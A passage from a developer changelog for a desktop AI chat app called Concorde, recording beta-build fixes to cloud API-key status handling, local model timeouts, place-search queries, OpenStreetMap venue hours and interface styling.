  focus hand-off and both Escape levels measured. Gauntlet 60/60.
- NOT verified on WebKit — the browser pane is Blink. Worth one glance
  in the desktop build before this ships.

## 6 beta 233 (pending release) — ☁️ Cloud Only, and honest key status
- A fourth mode sits under Fast/Thinking/Pro in BOTH pickers (the sidebar
  rows and the composer dropdown, which build from `TIERS` and
  `TIER_META` respectively, so one dict entry populated both). It answers
  entirely off the API keys: every working key drafts in parallel and the
  compositor ladder writes the final answer; with a single key it streams
  straight through.
- NOTHING RUNS LOCALLY, and that took more than skipping the council.
  `resolve_tier` returns [] early; the MLX engine load is skipped; the
  smallest-cached-model route fallback is skipped; reflection and peer
  review are forced off (both are local passes); the silent-answer rescue
  that retries on the smallest local brain is skipped; the place-pinning
  pass and the memory-extraction pass are skipped — both run a local
  model. Any one of those left in would have quietly broken the promise.
- Picking the tier IS the cloud opt-in, so the bench runs regardless of
  the separate `turbo` preference.
- Images say so instead of answering blind: the cloud path sends text
  only, so an attached image in this mode gets a note pointing at the
  other tiers rather than an answer about nothing.
- No keys: the tier greys out in both lists, its bubble says to add one
  under Settings › Cloud power, `setTier` refuses it, and a saved
  "Cloud Only" that has lost its keys falls back to Fast at boot. Asking
  anyway returns instructions, never a quiet local fallback.

### The reason "active keys" wasn't true yet
- `cloud_text` swallowed EVERY exception and returned "", so a revoked
  key and a retired model both looked like "that model had nothing to
  say". Found live while testing this: Groq showed a green ✓ in Settings
  while every call came back **401 Invalid API Key**, and the
  `gemini-2.5-pro` bench seat **404'd on every question** ("no longer
  available to new users" — the same trap gemini-2.5-flash sprang once
  before, now handled generically instead of per-model).
  Two of four cloud seats were dead weight on every council, silently.
- Now HTTPErrors are classified. 401/403 means the KEY is bad, so the
  provider is marked `fail` with the code — which is what makes "grey it
  out when no keys are active" mean *active*, not *last known good*.
  400/404 means the MODEL is gone, so only that model is retired, and
  the retirement persists in `cloud.json` (`dead: [...]`) so a launch
  doesn't re-donate a seat to it. Re-saving that provider's key clears
  the list and revives the in-memory set — re-saving IS the retry.
- The alternate picker no longer falls back to `alts[0]`. Once dead
  models were skipped it walked the inventory into
  `gemini-3.7-flash-video-understanding-eap`, seating an unknown voice
  on the council. An alternate must be a bigger sibling (pro/120b/70b)
  or the provider fields one seat.
- Measured: bench went 4 seats → 2 real ones; Settings reads
  `✓Gemini  ✗Groq · key rejected (HTTP 401)  ✓Claude · in use`;
  retirement survived a restart; Fast-tier turbo (the refactored
  `cloud_stream`) still streams. Gauntlet 60/60.
- STILL OPEN, not touched: the composite gate is `len(_t) > 120`, so a
  legitimately terse composite ("Lisbon.") is rejected and the ladder
  burns every rung before falling back to a raw draft. Pre-existing and
  shared with Thinking/Pro — worth a look, but it's a tuned quality
  heuristic and not this change's business.

## 6 beta 234 (pending release) — telling a cut-off key from a dead one
- "Invalid API Key" is what a provider says for a HALF-PASTED key and for
  a REVOKED one alike, and the field is a password box, so there is no
  way to tell by eye. The save handler now judges the key's shape and
  names which failure it is.
- PREFIX FIRST, then length. The prefix confirms the vendor; only then is
  the length worth judging. That ordering means a format change upstream
  can never block a good key — an unrecognised prefix only ever adds a
  hint, never a rejection.
- A right-prefix, short key is rejected BEFORE the network: no round trip
  to be told something we already know.
- ONLY GROQ HAS AN EXACT LENGTH (gsk_ + 52 = 56). This was almost a bug
  that shipped: the first cut had Gemini at a fixed 39 (the old AIza
  width), and measuring this machine's own working keys showed Google
  now issues 53 and Anthropic 108. With `!=` on an exact length, both
  real keys would have been reported as truncated pastes — the precise
  failure the feature exists to prevent. Gemini and Claude are floors
  now, and the message says "at least N" for them.
- Three outcomes, verified against synthetic keys at real-world lengths:
    prefix ok, short          -> "that paste looks cut off — 28 characters,
                                  but a Groq key is 56"
    prefix wrong              -> "...doesn't look like a Groq key: they
                                  start with gsk_. Wrong provider
                                  selected, or the front of the paste was
                                  lost"
    prefix ok, plausible len  -> "the key is the right shape, so this isn't
                                  a bad paste: it has been revoked or
                                  regenerated. Issue a fresh one"
- FOUND BY THIS: the Groq key on this machine is a full, well-formed 56
  characters — so it was never a paste problem. It is revoked. That is
  now what the app says instead of leaving "Invalid API Key" to be
  argued with.
- TESTING NOTE: the failure branch WRITES the attempted key into
  cloud.json (status fail). Any test of the save path must back the file
  up and restore it — done here, verified byte-identical both times.
- Gauntlet 60/60.

## 6 beta 235 (pending release) — a spent quota is not a dead key
- REGRESSION FROM b233/b234, found live within the hour: Settings showed
  ✗ Gemini with "You exceeded your current quota", while `/models` on
  the very same key answered **200**. The key was perfect. The app had
  marked a healthy provider permanently failed over a free-tier quota
  that refills by itself, and nothing but a manual re-paste would clear
  it. Two builds' worth of "honest key status" had made the app
  confidently wrong.
- ROOT CAUSE, two places. The save path marked `fail` on ANY HTTPError —
  and the save probe SPENDS QUOTA, so a 429 there is entirely normal on
  a free tier. And `cloud_note_failure` classified purely on the status
  code, treating 403 as auth; Google returns 403 for some quota
  conditions, so a throttle could down a provider at runtime too.
- THE BODY GETS A VOTE. `cloud_failure_kind(code, body)` returns
  auth / quota / other, matching on the code AND on quota language
  (quota, rate limit, resource exhausted, too many requests, billing).
  Unit-checked against eight real messages, including 403
  RESOURCE_EXHAUSTED (quota, not auth) and 403 "not authorized" (auth,
  not quota).
- A THROTTLED PROVIDER RESTS, IT DOES NOT FAIL. status stays `ok` and a
  `cool` timestamp benches it for 10 minutes: `cloud_ok_providers()`
  skips it so no council seat is wasted on a guaranteed 429, and it
  returns on its own the moment the window passes. A rate-limited key
  now SAVES successfully with a warning, because it is a good key.
- `cloud_conf()` no longer hands back a failed or resting active
  provider — it falls through to any other working one before giving up
  on the turbo path. Matched on provider id, not dict equality.
- ONE-TIME REPAIR: `_cloud_repair()` runs once per process and converts
  any provider sitting at `fail` with a quota-shaped note back to ok
  plus a cooldown. Anyone who ran b233/b234 heals on next launch without
  touching a thing. Verified on this machine: gemini fail -> ok, resting.
- Board shows a third state — amber ⏳ "resting 10m · quota" instead of
  the red ✗ that means "go fix your key".
- Measured end to end: repair fired on launch; bench dropped to Claude
  alone while Gemini rested; Cloud Only took its single-provider
  STREAMING path (first exercise of that branch) and answered; Fast-tier
  turbo answered; the cooldown expiring put Gemini back on the bench
  unaided, and the next 429 re-rested it — still never `fail`.
- Gauntlet 60/60.
- NOT CHANGED, worth a look: the Gemini pick is `gemini-3-flash-preview`,
  chosen because "gemini-3-flash" heads the discovery preference order.
  Preview models carry the tightest free-tier quotas, which is why this
  keeps happening; `gemini-flash-latest` is in the same inventory.

## 6 beta 236 (pending release) — one cloud model failing never ends a query
- The rule, per Patrick: a cloud model that hits a limit OR fails in any
  other way is DROPPED (hourglass) and the query carries on with whatever
  still works. Five gaps stood between b235 and that rule.
- ONLY QUOTA RESTED ANYTHING. A 500, a timeout, a dropped connection or
  an empty completion recorded nothing at all, so the same broken
  provider was asked again on the very next question. Now every one of
  those rests it for GLITCH_COOLDOWN (2 min, vs 10 for a quota — a
  glitch is usually a glitch and the provider is wanted back). Only a
  rejected KEY still marks `fail`, because only that needs a human.
- THE COUNCIL'S CLOUD THREAD WAS UNGUARDED. `status()` writes to the
  client socket, so a reader closing the tab raised inside the thread —
  killing it before `run_mark(rm=)` and `took_part()` ran, which pinned
  that model in the "Running…" label forever and lost it from the
  ledger. Whole body is now try/except with the un-marking in a
  `finally`. A cloud voice can fail in every way there is without taking
  anything else with it.
- THE JOIN WAS 75s PER THREAD, sequentially — four hung providers could
  have held the answer for five minutes. They start together, so they
  share ONE deadline now; whatever hasn't landed is simply absent.
- TWO PLACES COULD ABORT THE QUERY OUTRIGHT: the single-provider Cloud
  Only path raised "the cloud provider didn't answer", and a council
  where every cloud voice failed raised "none of the selected models
  answered" straight at the reader. Both are caught now.
- `_cloud_all_down()` writes the honest version: which providers are
  resting AND ROUGHLY WHEN THEY RETURN, which need a new key, and that
  Fast/Thinking/Pro will answer it on this machine right now. "Try again
  later" is useless without the later.
- Measured with every provider rested by hand: bench empty, Cloud Only
  greyed (`available:false`), the query answered with the explanation
  above instead of an error, and Fast tier fell straight through to
  Gemma 4 26B and answered normally. Unreachable-endpoint checks confirm
  `cloud_text` and `cloud_stream_conf` return ""/False rather than
  raising, and that an unrecognised base writes nothing to config.
- Gauntlet 60/60.

## 6 beta 237 (pending release) — place questions search; nothing waits forever
### The 1/5 answer: the search gate was a GRAMMAR test
- "late night restaurants in 11221" got an apology for having no data.
  It never searched. `needs_search()` fires on a leading question word,
  a "?", or a freshness word — and that phrasing has none, so the one
  class of question where a model's memory is guaranteed useless went
  straight to memory. Measured, all previously FALSE:
      late night restaurants in 11221 · restaurants open late in 11221
      late night eats bushwick · coffee near 11221 · sushi in brooklyn
  Adding "best", or a "?", or leading with "where" flipped every one of
  them to True. The gate never asked the only question that mattered:
  is this about a PLACE?
- `_place_terms()` is no help as a detector — it is a filler-stripper
  and returns non-empty for "explain recursion in python" too. So:
  `_VENUE_RX` (venue and cuisine categories), `_ZIP_RX` (a US zip), and
  `_NEARBY_RX` ("near me", "open now"). Any hit searches, whatever the
  grammar. Placed AFTER the `_SELF_CONTAINED` check so "translate my
  restaurant menu into spanish" still stays local — verified.
- SECOND HALF, same bug: `placey` (the map + pins path) was gated on
  hours/open/closed/phone/address/menu/reservation, which "late night
  restaurants in 11221" also fails — so even a searched place query took
  the plain web path. `_VENUE_RX` counts there too now.
- Before: an apology. After: 5 sources incl. the Yelp page for 11221,
  named venues with addresses and Sunday hours, 3 pinned.

### The seven-minute answer: no deadline on the local loop
- Phi-4 14B benchmarks at 4.3s standalone. Inside that council it ran
  336 SECONDS and produced nothing. Not the model: every council model
  here is MLX, MLX pins the whole model in RAM, so each one in turn is a
  full disk load with the previous evicted — and with 18.9 GB free
  against Gemma 4 26B's 17.0 GB it thrashed. Qwen 3.6 35B MoE wants
  20.0 GB and was correctly skipped ("(no answer — low memory)", the
  ~6 tok in the log).
- The cloud bench got a shared deadline in b236. The local loop had NONE
  — one straggler could hold the answer indefinitely. Now each model
  runs on a thread with a 120s cap under a 240s whole-loop budget;
  whatever hasn't answered is simply absent, the same treatment a failed
  cloud voice gets. Partial output over 200 chars is kept rather than
  thrown away. Abandoned threads are daemons and the next model's engine
  swap stops the process they are stuck in.
- Measured on the same question: 414s -> 251s, and Phi-4 delivered a
  real 1068-char draft instead of nothing.
- HONEST LIMIT: 251s is still slow, and the deadline only caps the worst
  case. Three large MLX models in one tier means three sequential engine
  loads on this machine; making Thinking genuinely fast needs resident
  engines or a smaller roster, not a timeout.

### The number that started it
- The ZITO terminal printed one clock with no marker, so "Phi-4 44.91s"
  read as a duration when it was a timestamp — it meant Phi-4 STARTED
  there. Now `@44.9s` is the wall clock and `+336.5s` is how long the
  spoke took, and a draft line shows both.
- Gauntlet 60/60.

## 6 beta 238 (pending release) — a follow-up after a funnel knows its subject
- "where can i find this in 11221?" straight after a funnel that had
  settled on a sushi combo searched a BARE ZIP and came back with
  zillow, hotelplanner, crimegrade and housecashin — apartment listings
  and crime stats. The model then said, correctly, that it had no idea
  what "this" referred to.
- TWO faults, and the second one nearly shipped unnoticed.
  1. `_entity_thin("where can i find this in 11221?")` was FALSE.
     `_place_terms` leaves "find 11221" — a verb and a zip — so the code
     decided the query names a thing and never tried to inherit a
     subject. A demonstrative with no noun of its own IS the signal that
     the subject is upstream, so `_REFERS_BACK_RX` (this/that/these/it/
     them/there/the same) now makes a query thin on its own.
  2. FUNNEL PICKS ARE ASSISTANT TURNS. The client records each one as
     `{role:"assistant", content:"question → choice"}`, and
     `_thread_terms` only ever scanned USER turns — so the only user
     turn was the goal line and it returned "". `_thread_terms` now
     harvests the "→ choice" lines from the last 14 messages, earliest
     first (the early picks are the category, "Sushi"; the late ones are
     trailing detail, "Water").
- PROCESS NOTE, worth keeping: fix 1 was "verified" against a transcript
  written by hand with the picks as USER turns — it passed, and it was
  meaningless. Re-running it against the shape the client actually emits
  returned "" and exposed fault 2. Reconstructed fixtures must be copied
  from the producing code, not from memory of it.
- Measured on the real shape:
    before: "where can i find this in 11221?"
    after : "sushi combo platter deluxe where can i find this in 11221?"
  Ordinary follow-ups unchanged ("how tall is it?" -> "brooklyn bridge"),
  and with no history nothing is prepended.

## 6 beta 238 — the acceleration lockup
- A chip beside the engine chip naming the silicon path local models
  actually run on: MLX on Apple Silicon, CUDA on an NVIDIA box, and
  nothing at all on plain CPU (there is nothing to boast about). Served
  as `accel` on /api/setup from `accel_name()`, cached because
  nvidia-smi is a subprocess.
- A WORDMARK, not either vendor's artwork: it stays in the app's own
  greyscale type instead of importing a green eye, reads at 10px where a
  logo would not, and avoids reproducing a trademark. The dot carries
  the vendor colour (#76b900 NVIDIA green, #c9ccd2 Apple silver) so the
  two read apart instantly.
- 9px made the pill 22px against the engine chip's 23 and the pair sat a
  hair out of true. At 10px both measure 23px with identical top and
  bottom — checked, not eyeballed.
- Gauntlet 60/60.

## 6 beta 239 (pending release) — the MLX swap actually completes
- Patrick asked whether the council could run models sequentially instead
  of loading them at once. IT ALREADY DOES, and always did: the local
  loop is a plain `for`, `run_model` calls `ensure_mlx_engine` under
  `_engine_lock`, and that calls `_stop_other_mlx`, which terminates
  every other MLX engine. One resident engine is an existing invariant —
  nothing in b237 changed it. Concurrency was never the problem.
- MEASURED: a healthy Gemma 4 26B -> Phi-4 14B swap is 1-4 SECONDS. So
  the 336s had nothing to do with load cost.
- WHAT IT ACTUALLY WAS: `_stop_other_mlx` sent SIGTERM, waited 8s, and
  then dropped the handle NO MATTER WHAT. A big engine slow to die still
  had its ~17 GB wired when the next one spawned into it; the newcomer
  crawled or died; `ensure_mlx_engine` then polled its full 180s; and
  `run_model`'s URLError path retried with the SAME 180s default, twice
  over. 180+180 = 360, and the observed figure was 336.
- Now: SIGTERM, then SIGKILL if it ignores that, and the handle is not
  dropped until the process is genuinely gone. The flat 2.5s Metal beat
  became a watch — poll available memory until it stops climbing, capped
  at 6s — so teardown is observed rather than guessed.
- And a retry gets a SHORT window (45s, not 180). The first attempt
  already had the long one; if the engine didn't come up then, more
  waiting is not the missing ingredient. Worst case went from ~540s
  (three full attempts) to ~270s, and the b237 per-model cap of 120s
  bounds it well below that inside a council anyway.
- Measured after: swaps 1.1-3.6s, single-resident invariant holds, and a
  three-model Thinking run finished in 31.2s with four real drafts.
- Gauntlet 60/60.

## 6 beta 240 (pending release) — the search QUERY was the problem
- Side by side against Claude on "any bars or clubs open" in Bushwick,
  Concorde said its search "pulled results for Clifton, NJ instead" and
  cited oneminuteenglish.org, superpages, restaurantji and yellowpages.
  It is not the backend. Measured on the same engine:
      "i meant whats a good spot. any bars or clubs open"
          -> Virginia Beach, San Diego, BODRUM, GTA5 mods, Yandex Translate
      "bars bushwick brooklyn open late"
          -> Yelp, The Infatuation's Bushwick bar guide, barsforkings
  Garbage in, garbage out. Three faults built the garbage.
- 1. THE LOCATION WAS TRUNCATED OFF. `_thread_terms` returned
  `toks[:4]` — from "any good bars or clubs open late/now in bushwick
  ny" that is "any good bars clubs", four generic words with the ONLY
  part that mattered cut off the end. It now borrows what the new query
  LACKS (`avoid=`), which leaves exactly "bushwick ny".
- 2. CONVERSATIONAL PREAMBLE WENT TO THE INDEX. "i meant", "actually",
  "sorry", "wait" are for the reader. `_PREAMBLE_RX` strips them.
- 3. A PLACE QUESTION WITH NO LOCATION never threaded: "any bars or
  clubs open" names venues, so `_entity_thin` said it has a subject —
  but a place search with no location is worthless. Venue queries thread
  too now.
- Subjective words joined `_PLACE_FILLER` (any/good/best/spot/place/
  recommend/…): the index has nouns, not opinions. Query went from
  "bushwick ny whats a good spot any bars clubs" to "bushwick ny bars
  clubs".
- HOST RANKING. Even a clean query returned tagvenue (venue hire),
  pinterest, tiktok and a YOGA STUDIO, while Yelp / Time Out / The
  Infatuation sat lower in the SAME list. `_host_score` demotes
  directory spam and promotes sources a person would actually open —
  demote, never drop, because sometimes the junk is all there is.
- AND `is_direct` WAS OUTRANKING IT. That gate asks "does this result
  mention the thing asked about", which is right for "is ables open" and
  useless for "bars in bushwick", where every directory mentions
  Bushwick. A query naming a CATEGORY is a discovery question and is
  ranked by host alone.
- Tripadvisor is deliberately NOT promoted: it put a yoga studio at rank
  0. Its guides are good, its per-venue pages are noise, and a hostname
  cannot tell them apart.
- Measured end state for that question: Time Out's Bushwick neighborhood
  guide first, then a Bushwick bars-and-restaurants guide naming
  Roberta's, then a nightclubs guide. Spam at the bottom.
- STILL NOT PARITY, and ranking heuristics will not get there. Claude's
  answer came from a PLACES API with structured hours, ratings and
  coordinates; this reads search snippets. The real fix is Google Places
  or Yelp Fusion behind `place_search` — a key, not a regex.
- Gauntlet 60/60.

## 6 beta 241 (pending release) — answer type, closer to Claude Code
- The rule that actually governs answer prose is `.msg.ai .body`, not the
  `.msg .body` above it — `--helv` never applied at all. Measured before
  touching anything: 14.75px / 25.08px leading / 15px between paragraphs,
  in a 661px column.
- Now 16px / 1.72 (27.5px) with a 1.2em block gap (19px), tracking a
  hair tighter at -.009em because a larger size needs less of it. The
  heading scale moved with it (23 / 19.5 / 17) — an 18px h2 over 16px
  prose barely read as a heading. List items breathe at .5em.
- Same 661px column: at 16px that is still roughly 70 characters, which
  is where prose wants to sit, so the measure did not need touching.
- HONEST LIMIT: this matches the METRICS — size, leading, block rhythm,
  measure. It cannot match the typeface. Claude's faces (Styrene,
  Tiempos) are commercial licences that can't be embedded in a shipped
  binary, so the stack stays system-native: SF Pro on macOS, Segoe on
  Windows. That is the same family of grotesque and the rhythm is what
  the eye actually reads, but it is a near-match, not a replica.
- Gauntlet 60/60.

## 6 beta 241 — settings hierarchy
- "Include Beta Releases" was 13px at full text colour, the same weight
  as "Check for updates" directly above it, so a niche preference read
  as a headline. Now 11.5px italic in --faint (measured 11.5 vs the
  button's 12.5), lifting to --dim on hover.
- "Forget me" was a bordered danger BUTTON competing with Close. Now
  "Forget Me": borderless, transparent, 11.5px, centred, underlined with
  a 3px offset, full row width — a quiet way out rather than a control.
  Its confirm-state reset string was updated to match the new casing,
  which is the kind of thing that silently reverts a label.

## Research note — hours and ratings WITHOUT an API key
- Scraping Google Maps was raised. Against it: it breaks Google's terms,
  the results are JS-rendered behind obfuscated endpoints that change
  without notice, and — the part that actually decides it — Concorde is
  a DISTRIBUTED DESKTOP APP, so the traffic comes from every user's own
  IP. The failure mode isn't our scraper breaking, it's users getting
  CAPTCHA'd on their personal Google accounts.
- MEASURED ALTERNATIVE, OpenStreetMap Overpass, free and keyless, same
  project as the Nominatim geocoder already in use:
      Bushwick bbox -> 40 bar/pub/nightclub venues in 1.1s
      33 of 40 (82%) carry structured opening_hours
      e.g. Mood Ring "Mo-Tu 17:00-02:00; We-Fr 17:00-04:00"
           Keybar    "Mo-Th 18:00-02:00; Fr-Sa 18:00-04:00; Su 18:00-24:00"
      real venues, machine-readable, no key, no billing account
      ratings: ZERO — OSM carries none
- So HOURS, the perishable half of "open late tonight", are available
  free and legally. RATINGS are the part that needs a commercial
  provider (Foursquare's free tier has them; Yelp has them).
- Gauntlet 60/60.

## 6 beta 241 — the wordmark becomes a delta wing
- Per Patrick's sketch: the dock icon's diagonal gradient sweeps INTO
  the C rather than sitting beside it as a separate glyph. Right idea
  for something called Concorde — the mark is a wing whose trailing
  edge is the letter.
- Same construction as make_icon.py (parallel bars, each shorter toward
  the corner so the group reads as a triangle) and the same greyscale
  ramp, but REVERSED: steel at the far tip, brightest where it meets
  the C, so the eye carries the sweep into the type instead of stopping
  at it.
- The sweep is shallower than the icon's 45 degrees — measured against
  the sketch, whose hypotenuse is noticeably wider than tall, so it
  reads as a wing rather than a corner. viewBox widened to 23, four
  bars at ~39 degrees, 2.4 stroke.
- The 2px gap is gone (margin-right:-.5px): a gap read as
  icon-then-word, and the whole point is one lockup.
- The type was NOT touched — "the rest is fine". Notably the `b` was
  left as a plain inline run: making it inline-block to reach
  ::first-letter would have re-opened the b217 baseline divergence
  between Blink and WKWebView, which is documented right above this
  rule. The blend is carried by the gradient landing on the wordmark's
  own colour instead.
- Gauntlet 60/60, wordmark tests included.

## 6 beta 242 (pending release) — real venue hours, from OpenStreetMap
- `osm_places(terms, locality)`: Nominatim geocodes the locality, then
  Overpass returns named venues within 1400m of it. Free, keyless, and
  the same project the pin geocoder already uses. Cached 30 min per
  (category, locality) — venue hours barely change and the endpoint is
  a volunteer service.
- Fed into the answer as a LABELLED AUTHORITY placed ABOVE the web
  snippets, because a blog post's stale hours must never outrank a
  structured tag. Purely additive: no venues found changes nothing.
- Pins now come straight from the structured rows, preferring the venues
  the answer actually named. That replaces the old local-model
  extraction pass for these questions — OSM already knows the names and
  the coordinates, so running a model to re-read them was pure cost.
- `_oh_open_now()` parses a PRAGMATIC SUBSET of the opening_hours
  grammar: day ranges and lists, clock ranges, past-midnight spans,
  24/7. Anything with holidays, weeks or months returns False rather
  than guessing — a missed venue is a small loss, a venue wrongly called
  open is the whole failure.
- BUG CAUGHT BY TESTING AT 01:58 ON A SUNDAY: a past-midnight span
  belongs to YESTERDAY's rule. A bar posting "Mo-Sa 18:00-04:00" is open
  at 2am Sunday — it is still inside Saturday's span — but matching only
  today's weekday called it shut. Since "open late" is the entire point
  of the feature, that bug would have broken it precisely when it
  mattered. Now 7/7 on hand-built cases including that one.
- MEASURED, the same question that started this:
    before  "My search didn't turn up real bar or club listings for
             Bushwick tonight — it pulled results for Clifton, NJ"
    after   Bossa Nova Civic Club (open until 4am), Boobie Trap,
            Bonus Room — named, with hours, plus a caveat that Keybar
            and Christophers Palace close early on a Sunday, and four
            pins with coordinates.
  Bossa Nova is the same venue Claude named in the side-by-side.
- STILL NO RATINGS. OSM carries none; that half needs a commercial
  provider and is garnish next to knowing the door is open.
- Gauntlet 60/60.

## 6 beta 242 — the wing goes BEHIND the C, and a CSS bug that hid it
- A 72%-transparent letter occludes nothing, so the bars showed straight
  through the C's stroke — that was the "funky" overlap. The TYPE is
  opaque now and the 72% moved to the group: children composite first
  (the C hides the bars it crosses), then the lockup dims as one.
  `.vsub` compensates at .53 so the version row still renders at the
  .38 it always did.
- Overlap cut from 2.6px to 1.3px of an 11.7px mark — a tuck under the
  left stroke rather than a collision in the bowl.
- CAUGHT ONLY BY MEASURING: the mark was rendering 179x214px instead of
  11.7x9.8. The previous edit had appended a comment continuation AFTER
  an already-closed block comment, leaving a stray `*/` that killed the
  `#vmark` rule and everything after it in the stylesheet. A screenshot
  would have shown "a big logo"; getBoundingClientRect showed 179 and
  named the cause. Balance-audited every CSS comment afterwards: 165
  opens / 167 closes, and BOTH extra closers were false positives —
  `*/` inside JS regex literals like /\*\*(...)\*\*/g. One real bug.

## 6 beta 242 — starter prompts
- A row of clickable chips in the gap between the greeting and the
  composer. Placed INSIDE #composer-wrap, so it is the composer's width
  by construction rather than by a number that would drift — measured
  661 = 661.
- HOW MANY IS MEASURED, NOT GUESSED: ten candidates are laid out, then
  any that wrapped past the second row is removed. Chip widths vary with
  their text, so a fixed count would either overflow or leave a gap.
  `flex:1 1 auto` then grows the survivors to fill each row — measured
  99% span on both rows; centred chips had left ragged gutters against a
  full-width composer.
- 200 prompts in ten themed sets, one drawn from each and shuffled, so a
  refresh never shows five dinner questions in a row. The emoji is
  decoration: it is stripped before the question is sent.
- Emoji fonts are named explicitly in the stack — Space Grotesk has no
  glyphs for them and the ZWJ sequences fell through to tofu.
- Visible only on the empty hero, and re-fitted on window resize.
- Gauntlet 60/60.

## 6 beta 242 — the wing was genuinely short, and the same CSS trap twice
- Patrick: "still doesn't match the top and bottom of the C — looks
  smaller." He was right, and the box measurement said otherwise: the
  ELEMENT was 9.8px against a 9.77 cap. The ink was not filling it.
  The bars' right ends stopped at staggered heights, so at the junction
  — the one place the eye compares wing to letter — the painted span
  was 84% of the box with an empty bottom-right corner.
- A fifth short bar carries the trailing edge down to ~94%, and the
  element is now sized so the INKED span, not the box, equals the cap:
  painted 10.38 against cap 9.77, a ~6% optical overshoot that a
  tapering triangle needs against a solid stroke.
- LESSON: `getBoundingClientRect()` on the element measures the BOX.
  For a shape that does not fill its own viewBox, that number is a
  reassuring lie. Measure the painted geometry (the <g>, plus half the
  stroke width, which getBoundingClientRect excludes).
- AND THE SAME CSS TRAP FIRED TWICE: appending explanation to a comment
  that was already closed leaves a stray `*/`, which kills the rule
  after it AND everything below it in the sheet. First time it rendered
  the mark at 179x214. RULE: after editing any CSS comment, balance-audit
  the <style> blocks specifically — a whole-file scan reports false
  positives from `*/` inside JS regex literals like /\*\*(...)\*\*/g.
  Style blocks now 118 opens / 118 closes.

## 6 beta 243 (pending release) — Settings becomes rail and pane
- The dialog was one column of unrelated widgets. Now a 212px named rail
  on the left and ONE pane at a time on the right: Personality, Cloud
  power, Community, Models, Updates. The surface stops growing — the next
  setting gets a rail entry, not another row on a stack.
- EVERY CONTROL KEPT ITS ID and its markup; they were only reparented, so
  the JS wired to each one is untouched. Verified all 15 still resolve
  (persona, len-slider, turbo, ck-*, contrib, open-setup, about-check,
  betaup, about-forget, about-close) and every pane shows on click.
- THE SPEC LIST. "6 BETA 238 · M4 PRO" wrapped mid-word in a narrow rail
  and read as debris. It is a definition list now — label left, value
  right, one fact per line, so it cannot wrap and there is room for the
  memory Patrick asked for plus the accelerator:
      version 6 beta 238 · chip M4 PRO · memory 52 GB
      accel MLX · models 11 / 20
  Memory comes from /api/stats mem_total_gb, accel from /api/setup.
- TAG-COUNT CHECKED before running it: 26 <div> / 26 </div>, 5/5
  <section>, 1/1 <nav>. The 5.1 rebuild dropped one closing div and
  swallowed every veil below into the hidden modal; that is the failure
  this restructure was most likely to repeat.
- FALSE ALARM WORTH RECORDING: `#about-card` is a DUPLICATED id — the
  update and new-models dialogs reuse it. `querySelector("#about-card")`
  returns #new-veil's hidden copy and measures 0x0, which looks exactly
  like the old 0x0 bug. The settings CSS is ancestor-scoped
  (`#about-veil #about-card`) so it targets the right one; only the
  measurement was wrong. Measure with the ancestor in the selector.

## 6 beta 243 — answer type, chip width, hairline, vendor names
- Answer prose moves to the sidebar's own face: Space Grotesk 13px
  against the sidebar's measured 12.5. The system stack (SF here, Segoe
  on Windows) was a stranger in its own window and at 16px read as cheap.
  Heading scale came back down with it (18 / 15.5 / 13.5).
- Starter chips are PINNED TO THE COMPOSER: #composer-wrap is full width,
  so on a maximised window they ran 1252px against the composer's 780.
  Same max-width and auto margins — measured left 560 = 560, right
  1340 = 1340 at a 1600px viewport.
- The hairline under the hero was `body.perf #composer-wrap`'s border-top
  — perf mode only, which is why it looked intermittent. Gone.
- The accelerator chip names the VENDOR now, not the toolkit: NVIDIA
  rather than CUDA, AMD when rocm-smi answers, MLX unchanged. Each
  branch forced and verified. An AMD card without ROCm reads as CPU,
  which is honest.
- Gauntlet 60/60.

## 6 beta 243 — the stacked lockup, uniform everywhere
- Study 06 wins, in Michroma: wing centred ABOVE the wordmark. That is
  the primary mark wherever there is vertical room. The horizontal form —
  bars to the LEFT of the wordmark — stays as the compact variant for
  tight inline spots, which is the sidebar header.
- AUDITED EVERY SURFACE THAT DRAWS THE WORDMARK, and two of four were
  not even in the right face:
      sidebar        Michroma, horizontal   (already correct)
      settings rail  now Michroma, STACKED
      welcome door   was the body sans -> Michroma
      gate page      was the body sans AND never loaded the font at all
  So a new user's first sight of the logo was a different logo from the
  one inside the app. Both now load Michroma and render at weight 400 —
  the 700 they were using is a synthetic bold Michroma has no cut for.
- Measured after: rail brand and sidebar brand both report Michroma,
  wing 40x16 sits above a 114px wordmark inside a 211px rail, nothing
  clipped.
- SECOND DUPLICATE-ID TRAP TODAY: `#about-name` exists THREE times (the
  update and new-models dialogs reuse it), so
  `querySelector("#about-name")` returns a hidden copy in another veil
  and reports Helvetica at 0px wide. `#about-card` did the same thing an
  hour earlier. The CSS is fine because it is ancestor-scoped; it is
  MEASUREMENT that has to carry the ancestor. Scope every settings query
  to `#set-brand`/`#about-veil`, never a bare id.
- Gauntlet 60/60.

## 6 beta 240 (pending release) — the starter chips were INERT
- They looked right, hovered right, and did nothing. The handler was
  never the problem: `#composer-wrap` is `pointer-events:none` so it
  cannot block the backdrop behind it, and every child that wants clicks
  re-enables them — `#composer` does, `#suggest` never did. The click
  landed on <main> and the chips never saw it.
- PROVED WITH A HIT TEST, not a screenshot:
  `document.elementFromPoint()` at a chip's own centre returned MAIN, not
  the chip. Nothing visual distinguishes an inert control from a live
  one, so this is the only check that can find it — worth reaching for
  any time a control "looks fine but does nothing".
- One line: `#suggest{pointer-events:auto}`. After it, clicking
  "How do I beat jet lag?" asked the question, stripped the emoji,
  cleared the hero and streamed a real answer with 4 sources.
- Gauntlet 60/60.

## 6 beta 240 — the wing goes back beside the C, and maps come back
- OVERLAP REVERTED, per Patrick. The wing sits BESIDE the C with a real
  4px gap. Tucking it under the letterform read as a collision at every
  size tried; two clean shapes next to each other beat one muddled one.
  Measured: gap 4px, not overlapping, Michroma both sides.
- MAPS AND PINS WERE GONE, and the cause was one line. The locality
  handed to the geocoder was "the last two words of the place terms" —
  fine for a long question, catastrophic for a short one:
      "whats some good bbq in bushwick?"  ->  terms "bbq bushwick"
      last two words = "bbq bushwick"     ->  _geocode() = None
  No coordinates meant no OSM venues, no pins AND no map card, on a
  question that names the neighbourhood outright. The earlier bars
  query only worked by luck — it was long enough that its last two
  words happened to be the location.
- The locality is now WHAT REMAINS after removing the venue words and
  the relative-time words, which is the actual place:
      bbq bushwick               -> bushwick
      bars clubs late bushwick ny -> bushwick ny
      coffee williamsburg        -> williamsburg
  The map card's own geocode was reading the same bad string and is
  fixed with it.
- Verified end to end on the reported query: geo step resolves to
  Bushwick, MAP carries 40.694/-73.919, PLACES2 carries a pin.
- HONEST LIMIT: OSM is queried by AMENITY, not cuisine, so "bbq" asks
  for restaurants near Bushwick and the pins are not bbq-specific. The
  prose still names the right places from the web sources; the pins are
  neighbourhood context, not a filtered result.
